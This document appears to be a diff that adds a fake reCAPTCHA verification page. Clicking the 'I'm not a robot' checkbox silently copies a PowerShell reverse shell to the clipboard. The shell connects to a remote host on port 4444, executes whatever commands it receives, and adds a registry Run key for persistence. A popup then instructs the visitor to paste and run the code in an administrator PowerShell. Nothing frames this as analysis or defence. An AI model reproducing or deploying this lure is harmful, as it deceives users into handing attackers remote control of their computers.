@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify You Are Human</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f2f2f2;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            max-width: 700px; /* Increased width */
+            margin: 20px;
+            position: relative;
+        }
+        .recaptcha-box {
+            padding: 30px; /* Increased padding */
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .recaptcha-box h2 {
+            margin: 0 0 20px;
+            font-size: 32px; /* Larger font size */
+            color: #4285f4;
+        }
+        .recaptcha-box p {
+            margin: 0 0 20px;
+            font-size: 20px; /* Larger font size */
+            color: #666;
+        }
+        .recaptcha-checkbox {
+            display: inline-flex;
+            align-items: center;
+            padding: 15px; /* Increased padding */
+            background: #f9f9f9;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.2s ease; /* Faster transition */
+        }
+        .recaptcha-checkbox.checked {
+            background: #e8f0fe;
+            border-color: #4285f4;
+        }
+        .recaptcha-checkbox img {
+            margin-right: 10px;
+            width: 28px; /* Slightly larger image */
+            height: 28px;
+            transition: opacity 0.2s ease; /* Faster transition */
+        }
+        .recaptcha-checkbox span {
+            font-size: 18px; /* Larger font size */
+            color: #333;
+        }
+        .recaptcha-loading {
+            display: none;
+            width: 28px; /* Slightly larger spinner */
+            height: 28px;
+            margin-right: 10px;
+            animation: spin 0.4s linear infinite; /* Faster spin */
+        }
+        .recaptcha-loading.active {
+            display: inline-block;
+        }
+        .recaptcha-popup {
+            display: none;
+            padding: 25px; /* Increased padding */
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            text-align: left;
+            position: absolute;
+            top: 110%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            animation: fadeIn 0.2s ease; /* Faster fade-in */
+        }
+        .recaptcha-popup.active {
+            display: block;
+        }
+        .recaptcha-popup h3 {
+            margin: 0 0 15px;
+            font-size: 26px; /* Larger font size */
+            color: #333;
+        }
+        .recaptcha-popup p {
+            font-size: 20px; /* Larger font size */
+            color: #333;
+            margin: 5px 0;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10;
+            display: none;
+            animation: fadeIn 0.2s ease; /* Faster fade-in */
+        }
+        .overlay.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="overlay" id="overlay"></div>
+        <div class="recaptcha-box">
+            <h2>Verify You Are Human</h2>
+            <p>Please verify that you are a human to continue.</p>
+            <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
+                <span>I'm not a robot</span>
+                <div class="recaptcha-loading" id="recaptchaLoading"></div>
+            </div>
+            <div class="recaptcha-popup" id="recaptchaPopup">
+                <h3>Verification Steps</h3>
+                <p>1. Press Windows Button "<i class="fab fa-windows"></i>" + R</p>
+                <p>2. Type <code>powershell</code> and press <strong>Ctrl + Shift + Enter</strong> to run as administrator.</p>
+                <p>3. Press CTRL + V to paste the code.</p>
+                <p>4. Press Enter to execute.</p>
+            </div>
+        </div>
+    </div> 
+    
+    <script>
+        function verify() {
+            const recaptchaCheckbox = document.getElementById('recaptchaCheckbox');
+            const recaptchaLoading = document.getElementById('recaptchaLoading');
+            const recaptchaPopup = document.getElementById('recaptchaPopup');
+            const overlay = document.getElementById('overlay');
+
+            // Simulate loading animation
+            recaptchaCheckbox.classList.add('checked');
+            recaptchaLoading.classList.add('active');
+
+            setTimeout(() => {
+                recaptchaLoading.classList.remove('active');
+                recaptchaPopup.classList.add('active');
+                overlay.classList.add('active');
+
+                // Copy the PowerShell command to clipboard
+                const textToCopy = `while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient('192.168.1.10', 4444);
+        $stream = $client.GetStream();
+        [byte[]]$bytes = 0..65535|%{0};
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+            $sendback = (iex $data 2>&1 | Out-String );
+            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte, 0, $sendbyte.Length);
+            $stream.Flush()
+        }
+        $client.Close();
+    } catch {
+        Start-Sleep -Seconds 5;  # Wait before reconnecting
+    }
+}
+
+# Persistence via Registry (Run Key)
+$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+$regName = "Payload"
+$regValue = "powershell -ExecutionPolicy Bypass -File $PSCommandPath"
+Set-ItemProperty -Path $regPath -Name $regName -Value $regValue`;
+                const tempTextArea = document.createElement("textarea");
+                tempTextArea.value = textToCopy;
+                document.body.appendChild(tempTextArea);
+                tempTextArea.select();
+                document.execCommand("copy");
+                document.body.removeChild(tempTextArea);
+            }, 300); // Simulate a 0.3-second loading delay (very fast)
+        }
+
+        const recaptchaCheckbox = document.getElementById('recaptchaCheckbox');
+        recaptchaCheckbox.addEventListener('click', verify);
+    </script>
+</body>
+</html>
